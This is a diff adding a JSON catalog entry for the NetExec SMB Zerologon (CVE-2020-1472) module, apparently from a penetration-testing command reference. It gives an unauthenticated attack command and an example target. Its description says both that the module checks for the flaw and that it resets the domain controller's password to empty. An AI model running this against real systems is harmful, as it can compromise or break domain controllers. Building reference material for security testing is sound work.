@@ -1,0 +1,26 @@
+{
+  "id": "nxc-smb-zerologon",
+  "name": "NetExec SMB Zerologon",
+  "command": "nxc smb '<ip>' -u '' -p '' -M zerologon",
+  "description": "Check for Zerologon (CVE-2020-1472) vulnerability — resets DC computer account password to empty",
+  "platform": "linux",
+  "requires": [
+    "no-creds"
+  ],
+  "protocols": [
+    "smb",
+    "rpc"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "zerologon",
+    "cve-2020-1472",
+    "privilege-escalation",
+    "unauthenticated",
+    "critical"
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u '' -p '' -M zerologon"
+  ]
+}
